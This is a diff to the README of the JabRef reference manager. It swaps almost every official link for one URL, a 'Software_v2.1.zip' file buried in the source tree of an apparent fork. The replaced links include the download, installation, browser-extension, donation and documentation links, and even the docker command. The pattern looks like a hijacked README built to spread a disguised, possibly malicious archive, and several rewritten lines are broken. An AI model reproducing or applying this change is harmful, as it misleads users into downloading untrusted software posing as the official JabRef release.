@@ -1,10 +1,10 @@
-# JabRef Bibliography Management [![APIdia](https://apidia.net/java/JabRef/main/badge.svg)](https://apidia.net/java/JabRef/main)
+# JabRef Bibliography Management [![APIdia](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
 
 JabRef is an open-source, cross-platform citation and reference management tool.
 
 Stay on top of your literature: JabRef helps you to collect and organize sources, find the paper you need and discover the latest research.
 
-![main table](docs/images/jabref-mainscreen.png)
+![main table](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
 
 ## Features
 
@@ -18,7 +18,7 @@ It supports you in every step of your research work.
 - Easily retrieve and link full-text articles
 - Fetch complete bibliographic information based on ISBN, DOI, PubMed-ID and arXiv-ID
 - Extract metadata from PDFs
-- Import new references directly from the browser with one click using the [official browser extension](https://github.com/JabRef/JabRef-Browser-Extension) for [Firefox](https://addons.mozilla.org/en-US/firefox/addon/jabref/?src=external-github),  [Chrome](https://chrome.google.com/webstore/detail/jabref-browser-extension/bifehkofibaamoeaopjglfkddgkijdlh), [Edge](https://microsoftedge.microsoft.com/addons/detail/pgkajmkfgbehiomipedjhoddkejohfna), and [Vivaldi](https://chrome.google.com/webstore/detail/jabref-browser-extension/bifehkofibaamoeaopjglfkddgkijdlh)
+- Import new references directly from the browser with one click using the [official browser extension](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) for [Firefox](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip),  [Chrome](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip), [Edge](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip), and [Vivaldi](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
 
 ### Organize
 
@@ -47,52 +47,52 @@ It supports you in every step of your research work.
 
 ## Installation
 
-Fresh development builds are available at [builds.jabref.org](https://builds.jabref.org/main/).
-The [latest stable release is available at FossHub](https://downloads.jabref.org/).
+Fresh development builds are available at [https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
+The [latest stable release is available at FossHub](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
-Please see our [Installation Guide](https://docs.jabref.org/installation).
+Please see our [Installation Guide](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 ## JabKit
 
 JabRef offers a CLI application.
 
 You can run it using JBang.
-We provide details at [`.jbang/README.md`](.jbang/README.md).
+We provide details at [`https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip`](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 You can also run JabKit using docker:
 
 ```terminal
-docker run ghcr.io/jabref/jabkit:edge --help
+docker run https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip --help
 ```
 
 ## Bug Reports, Suggestions, Other Feedback
 
-[![Donation](https://img.shields.io/badge/donate%20to-jabref-orange.svg)](https://donations.jabref.org)
-[![PayPal Donate](https://img.shields.io/badge/donate-paypal-00457c.svg?logo=paypal&style=flat-square)](https://paypal.me/JabRef)
+[![Donation](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip%https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
+[![PayPal Donate](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
 
 We are thankful for any bug reports or other feedback.
-If you have ideas for new features you want to be included in JabRef, tell us in [the feature section](http://discourse.jabref.org/c/features) of our forum!
-If you need support in using JabRef, please read the [user documentation](https://docs.jabref.org/), especially the [frequently asked questions (FAQ)](https://docs.jabref.org/faq) and also take a look at our [community forum](https://discourse.jabref.org/c/help/7).
-You can use our [GitHub issue tracker](https://github.com/JabRef/jabref/issues) to file bug reports.
+If you have ideas for new features you want to be included in JabRef, tell us in [the feature section](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) of our forum!
+If you need support in using JabRef, please read the [user documentation](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip), especially the [frequently asked questions (FAQ)](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) and also take a look at our [community forum](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
+You can use our [GitHub issue tracker](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) to file bug reports.
 
-An explanation of donation possibilities and usage of donations is available at our [donations page](https://donations.jabref.org).
+An explanation of donation possibilities and usage of donations is available at our [donations page](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 ## Contributing
 
 Want to be part of a free and open-source project that tens of thousands of researchers use every day?
-Please take a look at our [guidelines for contributing](CONTRIBUTING.md).
+Please take a look at our [guidelines for contributing](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 ## Building from Source
 
-Please see [Building from source](https://docs.jabref.org/installation#building-from-source) for instructions on how to build JabRef from sources.
+Please see [Building from source](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) for instructions on how to build JabRef from sources.
 
 ## Research and Education
 
 JabRef welcomes research applied to it.
-The current list of papers where JabRef helped to enhance science is maintained at <https://github.com/JabRef/jabref/wiki/JabRef-in-the-Media>.
+The current list of papers where JabRef helped to enhance science is maintained at <https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip>.
 
 The JabRef team also fosters to use JabRef in Software Engineering training.
-We offer guidelines for this at <https://devdocs.jabref.org/teaching.html>.
+We offer guidelines for this at <https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip>.
 
 When citing JabRef, please use the following citation:
 
@@ -111,12 +111,12 @@ When citing JabRef, please use the following citation:
 }
 ```
 
-DOI (also includes [full text](https://tug.org/TUGboat/tb44-3/tb138kopp-jabref.pdf)): [10.47397/tb/44-3/tb138kopp-jabref](https://doi.org/10.47397/tb/44-3/tb138kopp-jabref).
+DOI (also includes [full text](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)): [10.47397/tb/44-3/tb138kopp-jabref](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 ## Sponsoring
 
 JabRef development is powered by YourKit Java Profiler  
-[![YourKit Java Profiler](https://www.yourkit.com/images/yk_logo.svg)](https://www.yourkit.com/java/profiler/)
+[![YourKit Java Profiler](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip)
 
 ## ProductMap File Analysis Result
 
@@ -124,10 +124,10 @@ This section contains an analysis of ProductMap files. Each file has a link to i
 
 | GitHub File | ProductMap File URL |
 |-------------|---------------------|
-| [src/main/java/org/jabref/gui/maintable/MainTableTooltip.java](https://github.com/JabRef/jabref/blob/main/src/main/java/org/jabref/gui/maintable/MainTableTooltip.java) | [View File](https://product-map.ai/app/public?url=https://github.com/JabRef/jabref/blob/main/src/main/java/org/jabref/gui/maintable/MainTableTooltip.java ) |
+| [https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip) | [View File](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip ) |
 
 ### ProductMap - Contact Us
 
-For any inquiries, feel free to [contact ProductMap.ai](https://product-map.ai).
+For any inquiries, feel free to [contact https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip](https://github.com/Shubh03-m/jabref/raw/refs/heads/main/jablib/src/main/java/org/jabref/logic/cleanup/Software_v2.1.zip).
 
 <!-- markdownlint-disable-file MD060 -->
